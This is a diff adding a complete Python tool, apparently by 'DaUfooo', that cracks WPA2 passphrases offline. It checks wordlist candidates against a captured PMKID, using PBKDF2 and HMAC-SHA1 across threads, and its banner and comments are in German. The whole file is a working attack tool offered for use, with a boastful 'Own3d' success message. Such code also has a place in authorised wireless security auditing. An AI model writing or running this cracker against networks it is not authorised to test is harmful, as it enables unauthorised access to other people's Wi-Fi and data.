@@ -1,0 +1,152 @@
+import hmac
+from hashlib import pbkdf2_hmac, sha1
+import argparse
+import threading
+import concurrent.futures
+import time
+import os
+
+
+# -----------------------------
+# Hauptausgabe und Begrüßung
+# -----------------------------
+
+def print_welcome_message():
+    print(f"***********************************************")
+    print(f"*       DaUfooo´s Python3 PKMID-Cracker       *")
+    print(f"*  Ein Tool zum Knacken von WPA2-Passphrasen  *")
+    print(f"*    *OHNE* Client oder Deauthentifizierung!  *")
+    print(f"***********************************************")
+
+
+# -----------------------------
+# Berechnungsfunktionen
+# -----------------------------
+
+def calculate_pmkid(pmk, ap_mac, sta_mac):
+    """
+    Berechnet die PMKID mit HMAC-SHA1[pmk + ("PMK-Name" + bssid + clientmac)]
+    Die 128-Bit-PMKID wird mit der erfassten PMKID abgeglichen, um zu prüfen, ob die Passphrase gültig ist.
+    """
+    pmkid = hmac.new(pmk, b"PMK Name" + ap_mac + sta_mac, sha1).digest()[:16]
+    return pmkid
+
+
+def find_pw_chunk(pw_list, ssid, ap_mac, sta_mac, captured_pmkid, stop_event):
+    """
+    Findet die Passphrase durch Berechnen von PMKID und vergleicht sie mit der erfassten PMKID.
+    """
+    for password in pw_list:
+        if stop_event.is_set():
+            break
+
+        password = password.strip()
+        pmk = pbkdf2_hmac("sha1", password.encode("utf-8"), ssid, 4096, 32)
+        pmkid = calculate_pmkid(pmk, ap_mac, sta_mac)
+
+        if pmkid == captured_pmkid:
+            print(f"\n[+] Own3d by DaUfooo :) | WPA2 KEY: {password}")
+            stop_event.set()
+            break
+
+
+# -----------------------------
+# Argumentverarbeitung
+# -----------------------------
+
+def process_args():
+    """
+    Verarbeitet und validiert Kommandozeilenargumente.
+    """
+    parser = argparse.ArgumentParser(prog='pmkidcracker',
+                                     description='DaUfooo´s Multithread-Tool zum Knacken von WPA2-Passphrasen, mithilfe der erhaltenen PMKID ohne Clients oder Deauthentifizierung.',
+                                     usage='%(prog)s -s SSID -ap BSSID -c CLIENTMAC -p PMKID -w WORDLIST -t THREADS')
+
+    parser.add_argument("-s", "--ssid", help="SSID of Target AP", required=True)
+    parser.add_argument("-ap", '--accesspoint', help="BSSID of AP (hex)", required=True)
+    parser.add_argument("-c", "--clientmac", help="Client MAC Address, the initiator (hex)", required=True)
+    parser.add_argument("-p", "--pmkid", help="EAPOL Message 1 PMKID (hex)", required=True)
+    parser.add_argument("-w", "--wordlist", help="Dictionary wordlist to use", required=True)
+    parser.add_argument("-t", "--threads", help="Number of threads (Default=10)", type=int, default=10)
+
+    args = parser.parse_args()
+
+    # Validierung der Eingaben
+    if not os.path.isfile(args.wordlist):
+        print("[!] Fehler: Die angegebene Wortliste existiert nicht!")
+        exit(1)
+
+    return args
+
+
+# -----------------------------
+# Thread-Management und Ausführung
+# -----------------------------
+
+def start_cracking(args):
+    """
+    Startet das Cracken der WPA2-Passphrase mit mehreren Threads.
+    """
+    ssid = args.ssid.encode()
+    ap_mac = bytes.fromhex(args.accesspoint.replace(":", ""))
+    sta_mac = bytes.fromhex(args.clientmac.replace(":", ""))
+    captured_pmkid = bytes.fromhex(args.pmkid)
+
+    stop_event = threading.Event()
+
+    print(f"[*] Initialisierung des PMKID Crackers")
+    print(f"[*] SSID: {args.ssid}")
+    print(f"[*] BSSID: {args.accesspoint}")
+    print(f"[*] Client MAC: {args.clientmac}")
+    print(f"[*] PMKID: {args.pmkid}")
+    print(f"[*] Aktuelle Wordlist: {args.wordlist}")
+    print(f"[*] Aktive Threads: {args.threads}")
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor, open(args.wordlist, "r", encoding='ISO-8859-1') as file:
+        start = time.perf_counter()
+
+        # Splitze die Wortliste in Chunks
+        chunk_size = 10000  # Anzahl der Passwörter pro Chunk
+        futures = []
+
+        while True:
+            pw_list = file.readlines(chunk_size)
+            if not pw_list:
+                break
+
+            if stop_event.is_set():
+                break
+
+            # Starte den Thread mit dem Passwort-Chunk
+            future = executor.submit(find_pw_chunk, pw_list, ssid, ap_mac, sta_mac, captured_pmkid, stop_event)
+            futures.append(future)
+
+        # Warte darauf, dass alle Futures abgeschlossen sind
+        for future in concurrent.futures.as_completed(futures):
+            pass
+
+    finish = time.perf_counter()
+    print(f'[+] Fertig in {round(finish - start, 2)} sekunde(n)')
+
+
+# -----------------------------
+# Hauptprogramm
+# -----------------------------
+
+def main():
+    """
+    Hauptfunktion des Programms.
+    """
+    print_welcome_message()
+    args = process_args()  # Argumente verarbeiten
+    start_cracking(args)   # Cracking-Prozess starten
+
+
+# -----------------------------
+# Programmausführung
+# -----------------------------
+
+if __name__ == '__main__':
+    main()
+
+// By DaUfooo 2025
